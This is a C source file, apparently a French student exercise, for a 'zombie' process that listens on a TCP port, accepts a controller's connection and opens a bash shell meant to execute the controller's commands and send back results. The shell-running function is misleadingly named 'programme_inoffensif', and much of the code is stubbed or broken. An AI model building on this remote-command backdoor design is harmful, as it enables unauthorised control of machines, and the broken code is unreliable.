#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include <string.h>

#include "utils_v2.h"
#include "info.h"

volatile sig_atomic_t end = 0;

int initSocketZombie(int port)
{
  int sockfd = ssocket();
  sbind(port,sockfd);
  slisten(sockfd,5);
  return sockfd;
}

int choisirPort(){
    int port = 5001; // A FAIRE POUR QUE CE SOIT AU HASARD
    /*
      for (int i = 0; i < NUM_PORTS; i++) {
        printf("%d\n", PORTS[i]);
        //chosir un port au hasard (a faire)
    }
    */
    return port;
}

void EndZombieHandler(int num){
    end = 1;
}

void programme_inoffensif(void* adrr, void* portt, void* newsockfdd) {
    char* adr = adrr;
    int* port = portt;
    int* newsockfd = newsockfdd;
    //...
    FILE *fp = popen("/bin/bash", "r"); // Ouvrir un terminal bash
    if (fp == NULL) {
        perror("popen");
        exit(1);
    }

    // ...

    while(!end){
        // lis ce que lui envoie le controller
        // sread(newsockfd, ..., ...);

        // execute la commande dans le terminal

        // renvoie le resultat de la commande au controller
        // swrite(newsockfd,...,...);
    }

    exit(0);

    // A FAIRE : Attendre qu'une commande soit ecrite dans (memoire partagée/ socket ?jsp?) et 
    // l'exécuter. Apres l'avoir exécuter récupérer reponse et l'écrire dans memoire partagée 
    /* la suite du programme fait ca mais pas les bons arguments ont été passé dans la méthode
    par exemple: sem_id, z sont pas présent dans la méthode mais le sont dans main*/
    /*
        sem_down0(sem_id);
        fprintf(fp, "%s\n", z);//faire la commande dans le terminal bash
        fflush(fp);
        //lire reponse
        char response[1024] = {'\0'};
        fgets(response, 1024, fp);
        response[strcspn(response, "\n")] = '\0';
        //envoyer la réponse dans mémoire partagée
        strncpy(z, response, 1024);
        sem_up0(sem_id);  */  
}

int main(int argc, char *argv[]){
    int port;
    
    ssigaction(SIGINT, EndZombieHandler);

    if(argv[1] == NULL){
        port = choisirPort();
    }else{
        port = argv[1];
    }
    
    int sockfd = initSocketZombie(port);

    int newsockfd = saccept(sockfd);

    char* adr;
    int pid_zombie = fork_and_run3(programme_inoffensif, &adr, &port, &newsockfd);
    printf("%d", pid_zombie);

    /* Attente de la terminaison du processus fils */
    int status;
    swaitpid(pid_zombie, &status, 0);

    return 0;
    
}